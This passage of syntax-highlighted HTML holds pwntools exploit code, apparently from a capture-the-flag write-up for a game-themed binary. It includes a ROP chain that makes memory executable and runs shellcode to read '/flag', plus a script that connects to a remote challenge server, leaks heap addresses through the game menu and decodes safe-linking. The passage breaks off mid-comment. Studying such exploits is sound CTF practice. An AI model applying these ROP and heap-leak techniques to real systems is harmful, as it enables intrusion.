style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># debug("b *$rebase(0xBA84)")</span><br><span style="color:#393A34">inv</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#999999">,</span><span style="color:#B07D48"> des</span><span style="color:#999999">=</span><span style="color:#393A34">des</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">final_rop </span><span style="color:#999999">=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rax</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">10</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">d48</span><span style="color:#1e754f">)</span><span style="color:#AB5959">&#x26;0x</span><span style="color:#2F798A">fffffffffffff000</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rsi</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">1000</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdx_2</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#2993a3">)</span><span style="color:#AB5959">*</span><span style="color:#2F798A">2</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">syscall</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stack_leak </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">d48</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">open</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">/flag</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">read</span><span style="color:#1e754f">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_leak</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">final_rop </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">write</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> stack_leak</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sh</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">final_rop</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">sh</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><br><span style="color:#DBD7CAEE">filename </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">./pwn</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">arch</span><span style="color:#666666">=</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">amd64</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">tmux</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">neww</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">local </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">all_logs </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> elf</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">libc</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> local</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">filename</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">else</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">47.94.205.237</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 28709</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> debug</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">params</span><span style="color:#CB7676">=</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> an_log </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> all_logs</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        success</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">an_log</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pid </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> util</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pidof</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sh</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">pid</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> params</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> leak_info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    output_log </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C99076">{}</span><span style="color:#C98A7D"> => </span><span style="color:#C99076">{}</span><span style="color:#C98A7D77">'</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">format</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">name</span><span style="color:#666666">,</span><span style="color:#B8A965"> hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    all_logs</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">append</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output_log</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    success</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">output_log</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> get_name</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Name: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">warrior</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> move_s</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">s</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> move_d</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">d</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> shop</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> nums</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">shop</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">option: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">12</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">buy : </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">nums</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">14</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> shop2</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">shop</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">option: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">12</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">buy : </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">index</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">14</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> shop_show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">shop</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">option</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">13</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">1 gold)</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">   "</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    heap_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">sell: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">3</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">''</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">14</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> heap_leak</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> fight_dragon</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">search</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">action: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">5</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">item: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">500000</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">item: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> inv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">payload</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> des</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">inv</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">item : </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">4</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">action: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">name : </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">description : </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">6</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">'</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">New description : </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> des</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> leak</span><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> calc_heap</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#B8A965"> hex</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    s </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#B8A965">int</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#666666">,</span><span style="color:#BD976A"> base</span><span style="color:#666666">=</span><span style="color:#4C9A91">16</span><span style="color:#4d9375">)</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> s</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> s</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">copy</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">9</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        res</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">3</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><span style="color:#666666"> ^=</span><span style="color:#DBD7CAEE"> res</span><span style="color:#5eaab5">[</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> ""</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">join</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">x</span><span style="color:#d4976c">)</span><span style="color:#d4976c">[</span><span style="color:#4C9A91">2</span><span style="color:#666666">:</span><span style="color:#d4976c">]</span><span style="color:#4D9375"> for</span><span style="color:#DBD7CAEE"> x </span><span style="color:#4D9375">in</span><span style="color:#DBD7CAEE"> res</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><span style="color:#CB7676">def</span><span style="color:#B8A965"> map</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    sh</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">map</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">get_name</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">shop</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8500600</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">move_s</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">move_s</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">move_s</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">move_d</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">fight_dragon</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> shop_show</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># leak_info("heap_leak", heap_leak)</span><br><br><span style="color:#DBD7CAEE">heap_leak </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">calc_heap</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">heap_leak</span><span style="color:#4d9375">)</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">leak_info</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">heap_leak</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> heap_leak</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># debug("b *$rebase(0x1FB13)")</span><br><span style="color:#758575DD"># debug("b 